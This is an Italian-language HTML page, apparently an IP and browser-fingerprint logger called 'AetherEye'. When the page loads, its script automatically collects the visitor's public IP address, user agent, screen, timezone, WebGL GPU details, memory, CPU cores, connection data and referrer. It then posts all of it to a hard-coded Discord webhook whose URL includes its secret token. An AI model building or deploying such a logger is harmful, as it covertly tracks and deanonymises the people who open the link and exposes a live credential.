<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AetherEye - Logger Pulito</title>
    <style>
        body {
            background: #0a0a0a;
            color: #ffffff;
            font-family: 'Courier New', monospace;
            padding: 2rem;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #111;
            padding: 2rem;
            border: 1px solid #333;
            border-radius: 8px;
        }
        h1 {
            color: #00ff88;
            border-bottom: 2px solid #00ff88;
            padding-bottom: 0.5rem;
        }
        .log {
            background: #1a1a1a;
            padding: 1rem;
            margin: 1rem 0;
            border: 1px solid #333;
            border-radius: 4px;
            white-space: pre-wrap;
            font-size: 0.85rem;
            max-height: 400px;
            overflow-y: auto;
        }
        .status {
            display: inline-block;
            padding: 0.3rem 1rem;
            border-radius: 4px;
            font-weight: bold;
            margin: 0.5rem 0;
        }
        .status.success { background: #00aa44; color: #fff; }
        .status.fail { background: #cc2233; color: #fff; }
        .status.waiting { background: #ffaa00; color: #000; }
        .status.info { background: #0077cc; color: #fff; }
        button {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 0.8rem 2rem;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background: #00cc77;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🔍 AetherEye - Logger Pulito</h1>
    <p>Questa pagina raccoglie i tuoi dati e li invia al webhook Discord.</p>
    <p><strong>Webhook:</strong> <code>https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ</code></p>

    <div id="status" class="status waiting">⏳ In attesa...</div>

    <div class="log" id="log">[LOG] Inizializzazione...</div>

    <button id="sendBtn">📤 Invia manualmente</button>
    <button id="clearBtn">🗑️ Pulisci log</button>
</div>

<script>
    // ========================================
    // WEBHOOK (NON OFFUSCATO)
    // ========================================
    var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';

    // ========================================
    // LOG E STATUS
    // ========================================
    var logEl = document.getElementById('log');
    var statusEl = document.getElementById('status');

    function log(msg) {
        var time = new Date().toLocaleTimeString();
        logEl.textContent += '[' + time + '] ' + msg + '\n';
        console.log(msg);
        logEl.scrollTop = logEl.scrollHeight;
    }

    function setStatus(text, type) {
        statusEl.textContent = text;
        statusEl.className = 'status ' + type;
    }

    // ========================================
    // RACCOLTA DATI ESTESI
    // ========================================
    function getExtendedData() {
        var data = {
            platform: navigator.platform || 'unknown',
            language: navigator.language || navigator.userLanguage || 'unknown',
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth || 'unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
            referrer: document.referrer || 'direct',
            url: window.location.href,
            userAgent: navigator.userAgent || 'unknown',
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
            cpuCores: navigator.hardwareConcurrency || 'unknown',
            touchPoints: navigator.maxTouchPoints || 0,
            cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No'
        };

        // WebGL (GPU)
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    data.webgl = vendor + ' | ' + renderer;
                }
            }
        } catch(e) {
            data.webgl = 'n/a (errore)';
        }

        // Connection info
        if (navigator.connection) {
            var conn = navigator.connection;
            data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps, RTT ' + (conn.rtt || '?') + 'ms)';
        } else {
            data.connection = 'n/a';
        }

        return data;
    }

    // ========================================
    // OTTIENI IP (via api.ipify.org)
    // ========================================
    function getIP(callback) {
        log('Richiedo IP a api.ipify.org...');
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                var data = JSON.parse(xhr.responseText);
                log('IP ottenuto: ' + data.ip);
                callback(data.ip);
            } else {
                log('api.ipify fallito, provo fallback...');
                getIPFallback(callback);
            }
        };
        xhr.onerror = function() {
            log('api.ipify errore, provo fallback...');
            getIPFallback(callback);
        };
        xhr.send();
    }

    function getIPFallback(callback) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'https://ipapi.co/json/', true);
        xhr2.onload = function() {
            if (xhr2.status === 200) {
                var data = JSON.parse(xhr2.responseText);
                log('IP fallback: ' + data.ip);
                callback(data.ip || 'unknown');
            } else {
                log('Fallback fallito, IP = unknown');
                callback('unknown');
            }
        };
        xhr2.onerror = function() {
            log('Fallback errore, IP = unknown');
            callback('unknown');
        };
        xhr2.send();
    }

    // ========================================
    // INVIO A DISCORD (con fetch + keepalive)
    // ========================================
    function sendToDiscord(ip, data) {
        log('Preparo payload...');

        var fields = [
            { name: '📡 IP', value: '`' + ip + '`', inline: true },
            { name: '🖥️ Platform', value: data.platform, inline: true },
            { name: '🌍 Language', value: data.language, inline: true },
            { name: '📱 Screen', value: data.screen, inline: true },
            { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
            { name: '🕐 Timezone', value: data.timezone, inline: true },
            { name: '🔗 Referrer', value: data.referrer, inline: false },
            { name: '📍 URL', value: data.url, inline: false },
            { name: '🧠 RAM', value: data.deviceMemory, inline: true },
            { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
            { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
            { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
            { name: '🎮 WebGL', value: data.webgl || 'n/a', inline: false },
            { name: '📶 Connection', value: data.connection, inline: false },
            { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
        ];

        var payload = {
            content: null,
            embeds: [{
                title: '🌐 **Full Visitor Profile**',
                color: 0x00ff88,
                fields: fields,
                footer: { text: 'AetherEye Logger • ' + new Date().toUTCString() },
                timestamp: new Date().toISOString()
            }]
        };

        log('Invio a Discord...');

        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).then(function(response) {
            if (response.status === 204 || response.status === 200) {
                log('✅ Inviato con successo! (status ' + response.status + ')');
                setStatus('✅ Dati inviati!', 'success');
            } else {
                log('❌ Risposta HTTP: ' + response.status);
                setStatus('❌ Errore ' + response.status, 'fail');
            }
        }).catch(function(err) {
            log('❌ Errore di rete: ' + err.message);
            setStatus('❌ Errore di rete', 'fail');
        });
    }

    // ========================================
    // FUNZIONE PRINCIPALE
    // ========================================
    function startLogging() {
        setStatus('⏳ Acquisizione...', 'waiting');
        log('Avvio raccolta dati...');
        var data = getExtendedData();
        log('Dati raccolti.');

        getIP(function(ip) {
            sendToDiscord(ip, data);
        });
    }

    // ========================================
    // ESEGUI AUTOMATICAMENTE AL CARICAMENTO
    // ========================================
    window.onload = function() {
        log('Pagina caricata. Avvio in 1 secondo...');
        setTimeout(startLogging, 1000);
    };

    // ========================================
    // PULSANTI
    // ========================================
    document.getElementById('sendBtn').addEventListener('click', function() {
        log('Invio manuale richiesto.');
        startLogging();
    });

    document.getElementById('clearBtn').addEventListener('click', function() {
        logEl.textContent = '';
        log('Log pulito.');
    });

</script>

</body>
</html>
